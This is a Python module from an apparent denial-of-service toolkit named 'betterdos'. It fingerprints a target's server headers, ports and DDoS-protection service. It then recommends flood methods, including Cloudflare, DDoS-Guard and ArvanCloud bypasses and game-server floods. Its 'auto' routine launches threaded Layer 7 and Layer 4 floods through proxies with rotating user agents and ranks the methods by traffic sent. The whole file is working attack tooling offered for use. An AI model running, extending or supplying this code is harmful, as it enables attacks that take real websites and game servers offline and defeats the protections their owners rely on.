"""MethodAdvisor — fingerprint targets and recommend attack methods."""

from contextlib import suppress
from pathlib import Path
from socket import AF_INET, SOCK_STREAM, gethostbyname, socket
from threading import Event
from time import sleep
from typing import List, Set

from PyRoxy import ProxyUtiles
from requests import Session
from yarl import URL

from betterdos.core import (BYTES_SEND, REQUESTS_SENT, Methods, ROOT_DIR,
                            Tools, bcolors, exit, logger, RUN_ID)
from betterdos.layer4 import Layer4
from betterdos.layer7 import HttpFlood
from betterdos.output import print_advise, print_auto_results


class MethodAdvisor:
    HTTP_PORTS = {80, 443, 8080, 8443}
    GAME_PORT_METHODS = {
        25565: ["MINECRAFT", "MCBOT"],
        19132: ["MCPE"],
        30120: ["FIVEM", "FIVEM-TOKEN"],
        9987: ["TS3"],
    }

    @staticmethod
    def _dedupe(values: List[str]) -> List[str]:
        out: List[str] = []
        seen = set()
        for value in values:
            if value not in seen:
                seen.add(value)
                out.append(value)
        return out

    @staticmethod
    def advise(target_raw: str) -> tuple:
        urlraw = target_raw.strip()
        if not urlraw.startswith("http"):
            urlraw = "http://" + urlraw

        target = URL(urlraw)
        if not target.host:
            exit("Invalid target for ADVISE")

        host = target.host
        port = target.port or (443 if target.scheme == "https" else 80)
        resolved_ip = "unresolved"
        status_code = "n/a"
        final_url = target.human_repr()
        headers = {}
        reasons: List[str] = []
        candidates: List[str] = []

        with suppress(Exception):
            resolved_ip = gethostbyname(host)

        with suppress(Exception), Session() as session:
            response = session.get(
                target.human_repr(),
                timeout=4,
                allow_redirects=True,
                headers={"User-Agent": "BetterDoS-Advisor/1.0"},
            )
            status_code = str(response.status_code)
            final_url = response.url
            headers = {k.lower(): v for k, v in response.headers.items()}

        tcp_reachable = False
        with suppress(Exception), socket(AF_INET, SOCK_STREAM) as tcp_sock:
            tcp_sock.settimeout(2)
            tcp_reachable = tcp_sock.connect_ex(
                (resolved_ip if resolved_ip != "unresolved" else host, port)) == 0

        is_http = port in MethodAdvisor.HTTP_PORTS or target.scheme in {"http", "https"}
        server_hdr = headers.get("server", "").lower()

        # --- L7 candidates for any HTTP(S) service ---
        if is_http:
            candidates.extend(["GET", "HEAD", "POST", "PPS", "EVEN",
                               "OVH", "STRESS", "COOKIE", "NULL",
                               "DYN", "RHEX", "STOMP", "BOT",
                               "DOWNLOADER", "SLOW"])
            reasons.append("HTTP(S) service: core L7 methods")

            candidates.extend(["BYPASS", "GSB"])
            reasons.append("HTTP(S) service: session-based methods")

        # --- Header-driven specialization ---
        if "cf-ray" in headers or "cloudflare" in server_hdr:
            candidates.extend(["CFB", "CFBUAM"])
            reasons.append("Cloudflare detected (cf-ray / server header)")

        if "ddos-guard" in server_hdr or "ddg" in headers.get("set-cookie", "").lower():
            candidates.append("DGB")
            reasons.append("DDoS-Guard detected")

        if "arvancloud" in server_hdr or "ar-" in headers.get("server", "").lower():
            candidates.append("AVB")
            reasons.append("ArvanCloud detected")

        if "apache" in server_hdr:
            candidates.append("APACHE")
            reasons.append("Apache server detected")

        if "x-powered-by" in headers and "php" in headers.get("x-powered-by", "").lower():
            candidates.append("XMLRPC")
            reasons.append("PHP detected — XMLRPC may apply")
        if "link" in headers and "wp-json" in headers.get("link", ""):
            candidates.append("XMLRPC")
            reasons.append("WordPress detected via Link header")

        # --- Game / service port methods ---
        if port in MethodAdvisor.GAME_PORT_METHODS:
            candidates.extend(MethodAdvisor.GAME_PORT_METHODS[port])
            reasons.append(f"Known game service port: {port}")

        # --- L4 candidates when TCP is reachable ---
        if tcp_reachable:
            candidates.extend(["TCP", "UDP", "CPS", "CONNECTION"])
            reasons.append("TCP reachable: L4 transport methods")

            if port == 27015:
                candidates.append("VSE")
                reasons.append("Valve Source Engine port detected")

        # --- Onion targets ---
        if ".onion" in host:
            candidates.append("TOR")
            reasons.append(".onion target detected")

        if not candidates:
            candidates.append("HEAD")
            reasons.append("Fallback safe baseline")

        candidates = MethodAdvisor._dedupe(candidates)

        print_advise(host, resolved_ip, port, tcp_reachable,
                     status_code, final_url, candidates, reasons)
        return candidates, resolved_ip, port, headers

    @staticmethod
    def auto(target_raw: str, threads: int = 5, probe_duration: int = 10,
             rpc: int = 5, proxy_ty: int = 0, proxy_file: str = "") -> None:
        """Run short probe trials per candidate method, rank by throughput."""
        global REQUESTS_SENT, BYTES_SEND

        candidates, resolved_ip, port, headers = MethodAdvisor.advise(target_raw)
        if not candidates:
            exit("ADVISE returned no candidates")

        urlraw = target_raw.strip()
        if not urlraw.startswith("http"):
            urlraw = "http://" + urlraw
        url = URL(urlraw)

        l7_candidates = [m for m in candidates if m in Methods.LAYER7_METHODS]
        l4_candidates = [m for m in candidates if m in Methods.LAYER4_METHODS]

        useragent_li = Path(ROOT_DIR / "files/useragent.txt")
        referers_li = Path(ROOT_DIR / "files/referers.txt")
        uagents = ({a.strip() for a in useragent_li.read_text().splitlines() if a.strip()}
                   if useragent_li.exists() else set())
        referers = ({a.strip() for a in referers_li.read_text().splitlines() if a.strip()}
                    if referers_li.exists() else set())

        proxies = None
        if proxy_file:
            proxy_li = Path(ROOT_DIR / "files/proxies" / proxy_file)
            if proxy_li.exists():
                proxies = ProxyUtiles.readFromFile(proxy_li)

        results = []

        for method in l7_candidates:
            host = url.host
            with suppress(Exception):
                host = gethostbyname(url.host)

            logger.info(f"{bcolors.WARNING}[run:{RUN_ID}] AUTO probing L7 method="
                        f"{bcolors.OKCYAN}{method}{bcolors.WARNING} for "
                        f"{bcolors.OKCYAN}{probe_duration}s{bcolors.RESET}")

            REQUESTS_SENT.set(0)
            BYTES_SEND.set(0)
            event = Event()
            event.clear()

            workers = []
            for tid in range(threads):
                t = HttpFlood(tid, url, host, method, rpc, event,
                              uagents or None, referers or None, proxies)
                t.start()
                workers.append(t)

            event.set()
            sleep(probe_duration)
            event.clear()

            total_pps = int(REQUESTS_SENT)
            total_bps = int(BYTES_SEND)
            results.append({
                "method": method,
                "layer": 7,
                "pps": total_pps,
                "bps": total_bps,
                "duration": probe_duration,
            })
            sleep(1)

        for method in l4_candidates:
            target_ip = resolved_ip if resolved_ip != "unresolved" else url.host
            with suppress(Exception):
                target_ip = gethostbyname(url.host)

            logger.info(f"{bcolors.WARNING}[run:{RUN_ID}] AUTO probing L4 method="
                        f"{bcolors.OKCYAN}{method}{bcolors.WARNING} for "
                        f"{bcolors.OKCYAN}{probe_duration}s{bcolors.RESET}")

            REQUESTS_SENT.set(0)
            BYTES_SEND.set(0)
            event = Event()
            event.clear()

            workers = []
            for _ in range(threads):
                t = Layer4((target_ip, port), None, method, event, proxies)
                t.start()
                workers.append(t)

            event.set()
            sleep(probe_duration)
            event.clear()

            total_pps = int(REQUESTS_SENT)
            total_bps = int(BYTES_SEND)
            results.append({
                "method": method,
                "layer": 4,
                "pps": total_pps,
                "bps": total_bps,
                "duration": probe_duration,
            })
            sleep(1)

        print_auto_results(results)
